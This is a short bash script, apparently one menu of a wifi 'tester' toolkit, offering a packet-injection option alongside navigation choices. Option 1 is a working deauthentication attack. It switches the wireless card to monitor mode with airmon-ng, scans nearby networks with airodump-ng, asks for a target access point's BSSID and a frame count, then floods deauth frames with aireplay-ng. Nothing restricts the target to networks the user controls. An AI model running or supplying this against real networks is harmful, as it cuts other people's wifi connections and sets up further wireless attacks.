#!/bin/bash
clear
echo ""
echo "----------------PACKET-INJECTION------------------"
echo "| 1. To Insert Deauthentication Packets 	 | 
| 2. To Return to Tester Mode		         |
| 3. To Return to Main Menu		         |
| 4. To Exit				         |"                                        
echo "--------------------------------------------------"
echo ""
read -p "Your Choice : " Pac
if [ "$Pac" -eq "1" ] 
then 
	ifconfig wlan0 down
	airmon-ng start wlan0
	timeout --foreground 30 airodump-ng mon0
	read -p "Enter BSSID To Send Deauth Packets : " BSSID
	#iwconfig mon0 channel $CHANNEL
	read -p "Enter The Number of Frames to Send : " NoOfFrames
	aireplay-ng --deauth $NoOfFrames -a $BSSID --ignore-negative-one mon0
	read -p "Exit ? (1/0) : " chCE
	if [ "$chCE" -eq "1" ]
	then
		sh TesterMode.sh
	else
		sh scripts/Packet_Inject.sh
	fi
elif [ "$Pac" -eq "2" ]
then
	sh TesterMode.sh
elif [ "$Pac" -eq "3" ]
then
	sh MainScript.sh
elif [ "$Pac" -eq "4" ]
then
	exit
fi
